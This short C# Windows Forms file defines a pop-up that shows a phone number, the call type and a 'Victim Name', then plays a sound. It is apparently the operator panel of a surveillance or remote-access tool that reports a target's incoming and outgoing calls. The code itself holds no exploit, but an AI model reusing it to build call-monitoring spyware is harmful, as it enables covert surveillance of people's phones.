using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;

namespace SV
{
    public partial class YeniArama : MetroFramework.Forms.MetroForm
    {
        SoundPlayer sp;
        public string ID;
        public YeniArama(string numara, string cagriTipi, string kurbanIsmi, string id)
        {
            InitializeComponent();
            ID = id;
            label1.Text = "Adress: " + numara;
            label2.Text = "Type: " + cagriTipi.ToLower().Replace("gelen", "Incoming").Replace("giden", "Outgoing").
            Replace("arama", "call");
            label3.Text = "Victim Name: " + kurbanIsmi;
            Screen ekran = Screen.FromPoint(Location);
            Location = new Point(ekran.WorkingArea.Right - Width, ekran.WorkingArea.Bottom - Height);
            sp = new SoundPlayer("call.wav"); sp.Play();
        }
     
        private void timer1_Tick(object sender, EventArgs e)
        {
            sp.Stop();
            Close();
        }
    }
}
